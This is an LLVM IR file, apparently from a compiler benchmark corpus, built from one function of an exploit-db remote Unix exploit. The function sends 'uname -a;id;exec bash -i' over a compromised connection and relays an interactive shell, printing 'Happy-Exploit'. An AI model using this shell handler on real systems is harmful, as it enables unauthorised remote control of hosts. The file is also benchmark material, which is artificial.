; ModuleID = '/home/carl/AnghaBench/exploitdb/exploits/unix/remote/extr_22449.c_send_recv_sh.c'
source_filename = "/home/carl/AnghaBench/exploitdb/exploits/unix/remote/extr_22449.c_send_recv_sh.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

%struct.timeval = type { i32, i32 }

@.str = private unnamed_addr constant [26 x i8] c"uname -a;id;exec bash -i\0A\00", align 1
@D_M = common dso_local global i32 0, align 4
@stdout = common dso_local global i32 0, align 4
@.str.1 = private unnamed_addr constant [37 x i8] c" [*] Executed shell successfully !\0A\0A\00", align 1
@STDIN_FILENO = common dso_local global i32 0, align 4
@.str.2 = private unnamed_addr constant [21 x i8] c" [*] Happy-Exploit\0A\0A\00", align 1
@.str.3 = private unnamed_addr constant [3 x i8] c"%s\00", align 1

; Function Attrs: noinline nounwind optnone uwtable
define dso_local void @send_recv_sh(i32 %0) #0 {
  %2 = alloca i32, align 4
  %3 = alloca i32, align 4
  %4 = alloca %struct.timeval, align 4
  %5 = alloca i8*, align 8
  %6 = alloca [1024 x i8], align 16
  %7 = alloca i32, align 4
  store i32 %0, i32* %2, align 4
  store i8* getelementptr inbounds ([26 x i8], [26 x i8]* @.str, i64 0, i64 0), i8** %5, align 8
  %8 = getelementptr inbounds [1024 x i8], [1024 x i8]* %6, i64 0, i64 0
  %9 = load i32, i32* @D_M, align 4
  %10 = call i32 @memset(i8* %8, i32 %9, i32 1024)
  %11 = load i32, i32* @stdout, align 4
  %12 = call i32 (i32, i8*, ...) @fprintf(i32 %11, i8* getelementptr inbounds ([37 x i8], [37 x i8]* @.str.1, i64 0, i64 0))
  %13 = load i32, i32* %2, align 4
  %14 = load i8*, i8** %5, align 8
  %15 = load i8*, i8** %5, align 8
  %16 = call i32 @strlen(i8* %15)
  %17 = load i32, i32* @D_M, align 4
  %18 = call i32 @send(i32 %13, i8* %14, i32 %16, i32 %17)
  %19 = getelementptr inbounds %struct.timeval, %struct.timeval* %4, i32 0, i32 0
  store i32 10, i32* %19, align 4
  %20 = load i32, i32* @D_M, align 4
  %21 = getelementptr inbounds %struct.timeval, %struct.timeval* %4, i32 0, i32 1
  store i32 %20, i32* %21, align 4
  br label %22

22:                                               ; preds = %1, %79
  %23 = load i32, i32* @stdout, align 4
  %24 = call i32 @fflush(i32 %23)
  %25 = call i32 @FD_ZERO(i32* %7)
  %26 = load i32, i32* %2, align 4
  %27 = call i32 @FD_SET(i32 %26, i32* %7)
  %28 = load i32, i32* @STDIN_FILENO, align 4
  %29 = call i32 @FD_SET(i32 %28, i32* %7)
  %30 = load i32, i32* %2, align 4
  %31 = add nsw i32 %30, 1
  %32 = call i32 @select(i32 %31, i32* %7, i32* null, i32* null, %struct.timeval* %4)
  %33 = load i32, i32* %2, align 4
  %34 = call i64 @FD_ISSET(i32 %33, i32* %7)
  %35 = icmp ne i64 %34, 0
  br i1 %35, label %36, label %57

36:                                               ; preds = %22
  %37 = load i32, i32* %2, align 4
  %38 = getelementptr inbounds [1024 x i8], [1024 x i8]* %6, i64 0, i64 0
  %39 = call i32 @read(i32 %37, i8* %38, i32 1023)
  store i32 %39, i32* %3, align 4
  %40 = load i32, i32* %3, align 4
  %41 = load i32, i32* @D_M, align 4
  %42 = icmp sle i32 %40, %41
  br i1 %42, label %43, label %48

43:                                               ; preds = %36
  %44 = load i32, i32* @stdout, align 4
  %45 = call i32 (i32, i8*, ...) @fprintf(i32 %44, i8* getelementptr inbounds ([21 x i8], [21 x i8]* @.str.2, i64 0, i64 0))
  %46 = load i32, i32* @D_M, align 4
  %47 = call i32 @exit(i32 %46) #3
  unreachable

48:                                               ; preds = %36
  %49 = load i32, i32* @D_M, align 4
  %50 = trunc i32 %49 to i8
  %51 = load i32, i32* %3, align 4
  %52 = sext i32 %51 to i64
  %53 = getelementptr inbounds [1024 x i8], [1024 x i8]* %6, i64 0, i64 %52
  store i8 %50, i8* %53, align 1
  %54 = load i32, i32* @stdout, align 4
  %55 = getelementptr inbounds [1024 x i8], [1024 x i8]* %6, i64 0, i64 0
  %56 = call i32 (i32, i8*, ...) @fprintf(i32 %54, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.3, i64 0, i64 0), i8* %55)
  br label %57

57:                                               ; preds = %48, %22
  %58 = load i32, i32* @STDIN_FILENO, align 4
  %59 = call i64 @FD_ISSET(i32 %58, i32* %7)
  %60 = icmp ne i64 %59, 0
  br i1 %60, label %61, label %79

61:                                               ; preds = %57
  %62 = load i32, i32* @STDIN_FILENO, align 4
  %63 = getelementptr inbounds [1024 x i8], [1024 x i8]* %6, i64 0, i64 0
  %64 = call i32 @read(i32 %62, i8* %63, i32 1023)
  store i32 %64, i32* %3, align 4
  %65 = load i32, i32* %3, align 4
  %66 = load i32, i32* @D_M, align 4
  %67 = icmp sgt i32 %65, %66
  br i1 %67, label %68, label %78

68:                                               ; preds = %61
  %69 = load i32, i32* @D_M, align 4
  %70 = trunc i32 %69 to i8
  %71 = load i32, i32* %3, align 4
  %72 = sext i32 %71 to i64
  %73 = getelementptr inbounds [1024 x i8], [1024 x i8]* %6, i64 0, i64 %72
  store i8 %70, i8* %73, align 1
  %74 = load i32, i32* %2, align 4
  %75 = getelementptr inbounds [1024 x i8], [1024 x i8]* %6, i64 0, i64 0
  %76 = load i32, i32* %3, align 4
  %77 = call i32 @write(i32 %74, i8* %75, i32 %76)
  br label %78

78:                                               ; preds = %68, %61
  br label %79

79:                                               ; preds = %78, %57
  br label %22
}

declare dso_local i32 @memset(i8*, i32, i32) #1

declare dso_local i32 @fprintf(i32, i8*, ...) #1

declare dso_local i32 @send(i32, i8*, i32, i32) #1

declare dso_local i32 @strlen(i8*) #1

declare dso_local i32 @fflush(i32) #1

declare dso_local i32 @FD_ZERO(i32*) #1

declare dso_local i32 @FD_SET(i32, i32*) #1

declare dso_local i32 @select(i32, i32*, i32*, i32*, %struct.timeval*) #1

declare dso_local i64 @FD_ISSET(i32, i32*) #1

declare dso_local i32 @read(i32, i8*, i32) #1

; Function Attrs: noreturn
declare dso_local i32 @exit(i32) #2

declare dso_local i32 @write(i32, i8*, i32) #1

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #2 = { noreturn "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #3 = { noreturn }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
